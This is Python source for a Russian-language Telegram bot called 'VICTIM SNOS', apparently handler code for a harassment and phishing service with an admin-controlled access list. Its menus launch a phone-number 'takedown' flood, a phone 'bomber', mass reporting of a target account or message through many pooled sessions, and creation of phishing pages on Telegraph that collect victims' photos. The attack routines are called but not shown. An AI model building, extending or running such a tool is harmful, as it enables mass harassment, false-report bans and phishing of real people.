def get_phish_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="СОЗДАТЬ ФИШ-ССЫЛКУ", callback_data="phish_create")
    builder.button(text="МОИ ССЫЛКИ", callback_data="phish_list")
    builder.button(text="НАЗАД", callback_data="main_menu")
    builder.adjust(1, 1, 1)
    return builder.as_markup()

def get_admin_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="ВЫДАТЬ ДОСТУП", callback_data="admin_add")
    builder.button(text="ЗАБРАТЬ ДОСТУП", callback_data="admin_remove")
    builder.button(text="СПИСОК", callback_data="admin_list")
    builder.button(text="ЛОГИ", callback_data="admin_logs")
    builder.button(text="НАЗАД", callback_data="main_menu")
    builder.adjust(2, 2, 1)
    return builder.as_markup()

async def delete_old_messages(user_id: int, chat_id: int):
    if user_id in user_messages:
        for msg_id in user_messages[user_id]:
            try:
                await bot.delete_message(chat_id, msg_id)
            except:
                pass
        user_messages[user_id] = []

async def send_message_with_banner(event: types.Message, text: str, markup=None):
    user_id = event.from_user.id
    await delete_old_messages(user_id, event.chat.id)
    
    if os.path.exists(BANNER_PATH):
        msg = await event.answer_photo(FSInputFile(BANNER_PATH), caption=text, reply_markup=markup)
    else:
        msg = await event.answer(text, reply_markup=markup)
    
    if user_id not in user_messages:
        user_messages[user_id] = []
    user_messages[user_id].append(msg.message_id)
    return msg

async def edit_message_with_banner(callback: types.CallbackQuery, text: str, markup=None):
    user_id = callback.from_user.id
    await callback.message.delete()
    
    if os.path.exists(BANNER_PATH):
        msg = await callback.message.answer_photo(FSInputFile(BANNER_PATH), caption=text, reply_markup=markup)
    else:
        msg = await callback.message.answer(text, reply_markup=markup)
    
    if user_id not in user_messages:
        user_messages[user_id] = []
    user_messages[user_id].append(msg.message_id)


# ---------- ХЕНДЛЕРЫ ----------
@dp.message(Command("start"))
async def start(msg: types.Message):
    user_id = msg.from_user.id
    if not await check_channel_subscription(user_id):
        await send_message_with_banner(msg, f"ПОДПИШИТЕСЬ НА КАНАЛ\n\n{CHANNEL_URL}")
        return
    
    if not is_user_allowed(user_id):
        await send_message_with_banner(msg, f"ДОСТУП ЗАПРЕЩЕН\n\nID: <code>{user_id}</code>")
        return
    
    if user_id not in user_sessions or not user_sessions[user_id].get("ready"):
        asyncio.create_task(ensure_user_sessions(user_id))
    
    await send_message_with_banner(
        msg,
        f"<b>VICTIM SNOS</b>\n\nID: <code>{user_id}</code>\nСессии: {get_user_sessions_count(user_id)}/{SESSIONS_PER_USER}",
        get_main_menu()
    )

@dp.message(Command("admin"))
async def admin_cmd(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    await send_message_with_banner(msg, f"<b>АДМИН</b>\n\nРазрешено: {len(ALLOWED_USERS)}", get_admin_menu())

@dp.callback_query(F.data == "snos_menu")
async def snos_menu(cb: types.CallbackQuery):
    await edit_message_with_banner(cb, f"<b>СНОС НОМЕРА</b>\n\n100 запросов/круг\nМакс. 10 кругов", get_snos_menu())
    await cb.answer()

@dp.callback_query(F.data == "snos_account_menu")
async def snos_account_menu(cb: types.CallbackQuery):
    await edit_message_with_banner(
        cb, 
        f"<b>СНОС АККАУНТА</b>\n\nМассовая отправка жалоб через сессии\nСессий: {get_user_sessions_count(cb.from_user.id)}/{SESSIONS_PER_USER}", 
        get_snos_account_menu()
    )
    await cb.answer()

@dp.callback_query(F.data == "snos_account_start")
async def snos_account_start(cb: types.CallbackQuery, state: FSMContext):
    if not await check_channel_subscription(cb.from_user.id):
        await cb.answer("Подпишитесь на канал!", show_alert=True)
        return
    
    can, wait = check_cooldown(cb.from_user.id, "snos_account")
    if not can:
        await cb.answer(f"Подождите {int(wait)} сек.", show_alert=True)
        return
    
    if not is_user_sessions_ready(cb.from_user.id):
        await cb.answer("Сессии загружаются...", show_alert=True)
        return
    
    if cb.from_user.id in active_snos_account:
        await cb.answer("Снос аккаунта уже запущен!", show_alert=True)
        return
    
    await state.set_state(SnosAccountState.waiting_username)
    await cb.message.delete()
    await cb.message.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption="<b>СНОС АККАУНТА</b>\n\nВведите юзернейм (без @):\n<code>username</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="snos_account_menu")]])
    )

@dp.message(StateFilter(SnosAccountState.waiting_username))
async def snos_account_username(msg: types.Message, state: FSMContext):
    username = msg.text.strip().replace("@", "")
    if not re.match(r'^[a-zA-Z][a-zA-Z0-9_]{3,31}$', username):
        await send_message_with_banner(msg, "Неверный формат юзернейма!")
        return
    
    await state.update_data(username=username)
    await state.set_state(SnosAccountState.waiting_reason)
    await msg.delete()
    await msg.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption=f"<b>Юзернейм: @{username}</b>\n\nВыберите причину жалобы:",
        reply_markup=get_snos_account_reason_menu()
    )

@dp.callback_query(F.data.startswith("snosreason_"))
async def snos_account_reason(cb: types.CallbackQuery, state: FSMContext):
    reason_key = cb.data.replace("snosreason_", "")
    data = await state.get_data()
    username = data["username"]
    user_id = cb.from_user.id
    
    await state.clear()
    await cb.message.delete()
    
    stop_event = asyncio.Event()
    active_snos_account[user_id] = {"stop_event": stop_event}
    
    reason_ru = SNOS_REPORT_REASONS_RU.get(reason_key, reason_key)
    st = await cb.message.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption=f"<b>СНОС АККАУНТА ЗАПУЩЕН</b>\n\nЮзернейм: @{username}\nПричина: {reason_ru}\n\nОтправка жалоб..."
    )
    
    async def progress_callback(current, total, success, flood, errors):
        try:
            await st.edit_caption(
                caption=f"<b>СНОС АККАУНТА</b>\n\n"
                f"Юзернейм: @{username}\n"
                f"Причина: {reason_ru}\n"
                f"Прогресс: {current}/{total}\n"
                f"Успешно: {success}\n"
                f"Флуд: {flood}\n"
                f"Ошибок: {errors}"
            )
        except:
            pass
    
    success, flood, errors, err_msg = await snos_account_attack(user_id, username, reason_key, progress_callback)
    
    await st.delete()
    if user_id in active_snos_account:
        del active_snos_account[user_id]
    
    total = success + flood + errors
    result_text = (
        f"<b>СНОС АККАУНТА ЗАВЕРШЕН</b>\n\n"
        f"Юзернейм: @{username}\n"
        f"Причина: {reason_ru}\n\n"
        f"Всего сессий: {total}\n"
        f"Успешно: {success}\n"
        f"Флуд: {flood}\n"
        f"Ошибок: {errors}"
    )
    if err_msg:
        result_text += f"\n\n{err_msg}"
    
    await cb.message.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption=result_text,
        reply_markup=get_main_menu()
    )

@dp.callback_query(F.data == "bomber_menu")
async def bomber_menu(cb: types.CallbackQuery):
    await edit_message_with_banner(cb, f"<b>БОМБЕР</b>\n\nСайтов: {len(BOMBER_WEBSITES)}", get_bomber_menu())
    await cb.answer()

@dp.callback_query(F.data == "report_menu")
async def report_menu(cb: types.CallbackQuery):
    await edit_message_with_banner(cb, f"<b>ЖАЛОБЫ НА СООБЩЕНИЯ</b>", get_report_menu())
    await cb.answer()

@dp.callback_query(F.data == "phish_menu")
async def phish_menu(cb: types.CallbackQuery):
    await edit_message_with_banner(cb, f"<b>ФИШИНГ</b>", get_phish_menu())
    await cb.answer()

@dp.callback_query(F.data == "admin_menu")
async def admin_menu_handler(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        return
    await edit_message_with_banner(cb, f"<b>АДМИН</b>", get_admin_menu())
    await cb.answer()

@dp.callback_query(F.data == "admin_logs")
async def admin_logs(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        return
    await edit_message_with_banner(
        cb, 
        f"<b>ЛОГИ</b>\n\n{get_last_logs(10)}", 
        InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="admin_menu")]])
    )

@dp.callback_query(F.data == "admin_add")
async def admin_add(cb: types.CallbackQuery, state: FSMContext):
    if cb.from_user.id != ADMIN_ID:
        return
    await state.set_state(AdminState.waiting_user_id)
    await cb.message.delete()
    await cb.message.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption="<b>ВЫДАТЬ ДОСТУП</b>\n\nВведите ID пользователя:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="admin_menu")]])
    )

@dp.message(StateFilter(AdminState.waiting_user_id))
async def admin_add_process(msg: types.Message, state: FSMContext):
    try:
        user_id = int(msg.text.strip())
        ALLOWED_USERS.add(user_id)
        save_allowed_users()
        await send_message_with_banner(msg, f"Добавлен <code>{user_id}</code>")
    except:
        await send_message_with_banner(msg, "Неверный ID!")
    await state.clear()

@dp.callback_query(F.data == "admin_remove")
async def admin_remove(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID or not ALLOWED_USERS:
        return
    builder = InlineKeyboardBuilder()
    for uid in list(ALLOWED_USERS)[:20]:
        builder.button(text=f"Удалить {uid}", callback_data=f"remove_{uid}")
    builder.button(text="НАЗАД", callback_data="admin_menu")
    builder.adjust(1)
    await edit_message_with_banner(cb, "<b>ЗАБРАТЬ ДОСТУП</b>", builder.as_markup())

@dp.callback_query(F.data.startswith("remove_"))
async def admin_remove_process(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        return
    user_id = int(cb.data.replace("remove_", ""))
    if user_id in ALLOWED_USERS:
        ALLOWED_USERS.remove(user_id)
        save_allowed_users()
    await edit_message_with_banner(cb, f"Удален <code>{user_id}</code>", get_admin_menu())

@dp.callback_query(F.data == "admin_list")
async def admin_list(cb: types.CallbackQuery):
    text = "<b>РАЗРЕШЕННЫЕ ПОЛЬЗОВАТЕЛИ</b>\n\n" + "\n".join(f"<code>{uid}</code>" for uid in ALLOWED_USERS) if ALLOWED_USERS else "Пусто"
    await edit_message_with_banner(cb, text, InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="admin_menu")]]))

@dp.callback_query(F.data == "main_menu")
async def main_menu(cb: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await edit_message_with_banner(cb, f"<b>VICTIM SNOS</b>\n\nID: <code>{cb.from_user.id}</code>", get_main_menu())

@dp.callback_query(F.data == "refresh_sessions")
async def refresh_sessions(cb: types.CallbackQuery):
    if cb.from_user.id in active_attacks or cb.from_user.id in active_snos_account:
        await cb.answer("Нельзя во время атаки!", show_alert=True)
        return
    await cb.answer("Обновление сессий...")
    asyncio.create_task(refresh_user_sessions(cb.from_user.id))

@dp.callback_query(F.data == "status")
async def status(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    await edit_message_with_banner(
        cb, 
        f"<b>СТАТУС</b>\n\nID: <code>{user_id}</code>\nСессии: {get_user_sessions_count(user_id)}/{SESSIONS_PER_USER}",
        InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="main_menu")]])
    )

@dp.callback_query(F.data == "snos")
async def snos_start(cb: types.CallbackQuery, state: FSMContext):
    if not await check_channel_subscription(cb.from_user.id):
        await cb.answer("Подпишитесь на канал!", show_alert=True)
        return
    
    can, wait = check_cooldown(cb.from_user.id, "snos")
    if not can:
        await cb.answer(f"Подождите {int(wait)} сек.", show_alert=True)
        return
    
    if not is_user_sessions_ready(cb.from_user.id):
        await cb.answer("Сессии загружаются...", show_alert=True)
        return
    
    if cb.from_user.id in active_attacks:
        await cb.answer("Снос уже запущен!", show_alert=True)
        return
    
    await state.set_state(SnosState.waiting_phone)
    await cb.message.delete()
    await cb.message.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption="<b>СНОС НОМЕРА</b>\n\nВведите номер:\n<code>+79991234567</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="snos_menu")]])
    )

@dp.message(StateFilter(SnosState.waiting_phone))
async def snos_phone(msg: types.Message, state: FSMContext):
    phone = msg.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    if not re.match(r'^\+\d{10,15}$', phone):
        await send_message_with_banner(msg, "Неверный формат номера!")
        return
    await state.update_data(phone=phone)
    await state.set_state(SnosState.waiting_count)
    await msg.delete()
    await send_message_with_banner(msg, f"Введите количество кругов (1-{MAX_ROUNDS}):")

@dp.message(StateFilter(SnosState.waiting_count))
async def snos_count(msg: types.Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1 or count > MAX_ROUNDS:
            await send_message_with_banner(msg, f"Введите от 1 до {MAX_ROUNDS}!")
            return
    except:
        await send_message_with_banner(msg, "Введите число!")
        return
    
    data = await state.get_data()
    phone = data["phone"]
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    stop_event = asyncio.Event()
    active_attacks[user_id] = {"stop_event": stop_event}
    
    st = await send_message_with_banner(msg, "<b>СНОС ЗАПУЩЕН</b>")
    
    async def progress_callback(cur, tot, ok_count):
        try:
            await st.edit_caption(caption=f"<b>СНОС НОМЕРА</b>\n\n{phone}\nКруг: {cur}/{tot}\nЗапросов: {ok_count}")
        except:
            pass
    
    ok = await snos_attack(user_id, phone, count, stop_event, progress_callback)
    
    asyncio.create_task(refresh_user_sessions(user_id))
    await st.delete()
    if user_id in active_attacks:
        del active_attacks[user_id]
    
    await send_message_with_banner(msg, f"<b>ЗАВЕРШЕНО</b>\n\n<code>{phone}</code>\nЗапросов: <b>{ok}</b>", get_main_menu())

@dp.callback_query(F.data == "bomber")
async def bomber_start(cb: types.CallbackQuery, state: FSMContext):
    if not await check_channel_subscription(cb.from_user.id):
        await cb.answer("Подпишитесь на канал!", show_alert=True)
        return
    
    can, wait = check_cooldown(cb.from_user.id, "bomber")
    if not can:
        await cb.answer(f"Подождите {int(wait)} сек.", show_alert=True)
        return
    
    if cb.from_user.id in active_bombers:
        await cb.answer("Бомбер уже запущен!", show_alert=True)
        return
    
    await state.set_state(BomberState.waiting_phone)
    await cb.message.delete()
    await cb.message.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption="<b>БОМБЕР</b>\n\nВведите номер:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="bomber_menu")]])
    )

@dp.message(StateFilter(BomberState.waiting_phone))
async def bomber_phone(msg: types.Message, state: FSMContext):
    phone = msg.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    await state.update_data(phone=phone)
    await state.set_state(BomberState.waiting_count)
    await msg.delete()
    await send_message_with_banner(msg, "Введите количество кругов (1-5):")

@dp.message(StateFilter(BomberState.waiting_count))
async def bomber_count(msg: types.Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1 or count > 5:
            await send_message_with_banner(msg, "Введите от 1 до 5!")
            return
    except:
        await send_message_with_banner(msg, "Введите число!")
        return
    
    data = await state.get_data()
    phone = data["phone"]
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    stop_event = asyncio.Event()
    active_bombers[user_id] = {"stop_event": stop_event}
    
    st = await send_message_with_banner(msg, "<b>БОМБЕР ЗАПУЩЕН</b>")
    
    async def progress_callback(cur, tot, ok_count):
        try:
            await st.edit_caption(caption=f"<b>БОМБЕР</b>\n\n{phone}\nКруг: {cur}/{tot}\nЗапросов: {ok_count}")
        except:
            pass
    
    ok = await bomber_attack(phone, count, user_id, stop_event, progress_callback)
    
    await st.delete()
    if user_id in active_bombers:
        del active_bombers[user_id]
    
    await send_message_with_banner(msg, f"<b>ЗАВЕРШЕНО</b>\n\n<code>{phone}</code>\nЗапросов: <b>{ok}</b>", get_main_menu())

@dp.callback_query(F.data == "report_msg")
async def report_msg_start(cb: types.CallbackQuery, state: FSMContext):
    if not await check_channel_subscription(cb.from_user.id):
        await cb.answer("Подпишитесь на канал!", show_alert=True)
        return
    
    if not is_user_sessions_ready(cb.from_user.id):
        await cb.answer("Сессии загружаются!", show_alert=True)
        return
    
    await state.set_state(ReportMessageState.waiting_link)
    await cb.message.delete()
    await cb.message.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption="<b>ЖАЛОБА НА СООБЩЕНИЕ</b>\n\nВведите ссылку:\n<code>https://t.me/username/123</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="report_menu")]])
    )

@dp.message(StateFilter(ReportMessageState.waiting_link))
async def report_msg_link(msg: types.Message, state: FSMContext):
    link = msg.text.strip()
    if not re.search(r't\.me/|telegram\.me/', link):
        await send_message_with_banner(msg, "Неверная ссылка!")
        return
    await state.update_data(link=link)
    await state.set_state(ReportMessageState.waiting_reason)
    await msg.delete()
    await msg.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption="<b>ВЫБЕРИТЕ ПРИЧИНУ</b>", 
        reply_markup=get_report_reason_menu()
    )

@dp.callback_query(F.data.startswith("reason_"))
async def report_msg_reason(cb: types.CallbackQuery, state: FSMContext):
    reason = cb.data.replace("reason_", "")
    data = await state.get_data()
    link = data["link"]
    user_id = cb.from_user.id
    
    await state.clear()
    await cb.message.delete()
    
    active_reports[user_id] = True
    st = await cb.message.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption="<b>ОТПРАВКА ЖАЛОБ...</b>"
    )
    
    async def progress_callback(current):
        try:
            await st.edit_caption(caption=f"<b>ОТПРАВКА</b>\n\nОтправлено: {current}")
        except:
            pass
    
    ok, err = await mass_report_message(user_id, link, reason, progress_callback)
    
    await st.delete()
    if user_id in active_reports:
        del active_reports[user_id]
    
    await cb.message.answer(f"<b>{'ГОТОВО' if ok else 'ОШИБКА'}</b>\n\nОтправлено: {ok}" + (f"\n{err}" if err else ""))
    await cb.message.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption="<b>VICTIM SNOS</b>", 
        reply_markup=get_main_menu()
    )

@dp.callback_query(F.data == "phish_create")
async def phish_create_start(cb: types.CallbackQuery, state: FSMContext):
    await state.set_state(PhishState.waiting_title)
    await cb.message.delete()
    await cb.message.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption="<b>СОЗДАНИЕ ФИШ-СТРАНИЦЫ</b>\n\nВведите заголовок:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="phish_menu")]])
    )

@dp.message(StateFilter(PhishState.waiting_title))
async def phish_title(msg: types.Message, state: FSMContext):
    await state.update_data(title=msg.text.strip())
    await state.set_state(PhishState.waiting_description)
    await msg.delete()
    await send_message_with_banner(msg, "Введите описание:")

@dp.message(StateFilter(PhishState.waiting_description))
async def phish_description(msg: types.Message, state: FSMContext):
    await state.update_data(description=msg.text.strip())
    await state.set_state(PhishState.waiting_button)
    await msg.delete()
    await send_message_with_banner(msg, "Введите текст кнопки:")

@dp.message(StateFilter(PhishState.waiting_button))
async def phish_button(msg: types.Message, state: FSMContext):
    button_text = msg.text.strip()
    data = await state.get_data()
    title = data["title"]
    description = data["description"]
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    st = await send_message_with_banner(msg, "<b>Создание ссылки...</b>")
    
    page_id = hashlib.md5(f"{user_id}_{time.time()}".encode()).hexdigest()[:8]
    url = await create_telegraph_page_fast(title, description, button_text, user_id, page_id)
    
    await st.delete()
    
    if url:
        add_log(user_id, "Фишинг", url)
        await send_message_with_banner(msg, f"<b>ССЫЛКА СОЗДАНА!</b>\n\n<code>{url}</code>", get_main_menu())
    else:
        await send_message_with_banner(msg, "<b>ОШИБКА СОЗДАНИЯ</b>", get_main_menu())

@dp.callback_query(F.data == "phish_list")
async def phish_list(cb: types.CallbackQuery):
    user_pages = [(i, d) for i, d in phish_pages.items() if d["chat_id"] == cb.from_user.id]
    if not user_pages:
        await edit_message_with_banner(
            cb, 
            "<b>МОИ ССЫЛКИ</b>\n\nПусто",
            InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="phish_menu")]])
        )
        return
    
    text = "<b>МОИ ССЫЛКИ</b>\n\n"
    for _, d in user_pages[-5:]:
        text += f"<code>{d['url']}</code>\n\n"
    
    await edit_message_with_banner(
        cb, 
        text,
        InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="phish_menu")]])
    )

@dp.callback_query(F.data == "stop")
async def stop(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    stopped = []
    
    if user_id in active_attacks:
        active_attacks[user_id]["stop_event"].set()
        del active_attacks[user_id]
        stopped.append("Снос")
    
    if user_id in active_bombers:
        active_bombers[user_id]["stop_event"].set()
        del active_bombers[user_id]
        stopped.append("Бомбер")
    
    if user_id in active_snos_account:
        active_snos_account[user_id]["stop_event"].set()
        del active_snos_account[user_id]
        stopped.append("Снос аккаунта")
    
    if stopped:
        await edit_message_with_banner(cb, f"<b>ОСТАНОВЛЕНО: {', '.join(stopped)}</b>", get_main_menu())
    else:
        await edit_message_with_banner(cb, "<b>НЕТ АКТИВНЫХ АТАК</b>", get_main_menu())

@dp.message(F.photo)
async def handle_photo(msg: types.Message):
    if msg.caption and "Жертва:" in msg.caption:
        m = re.search(r"Жертва: (\w+)", msg.caption)
        if m and m.group(1) in phish_pages:
            page = phish_pages[m.group(1)]
            await msg.reply(f"<b>НОВОЕ ФОТО!</b>\n\n{page['url']}")
            add_log(msg.from_user.id, "Фишинг: фото", page['url'])


# ---------- ЗАПУСК ----------
async def main():
    load_allowed_users()
    logger.info("VICTIM SNOS запуск")
    
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
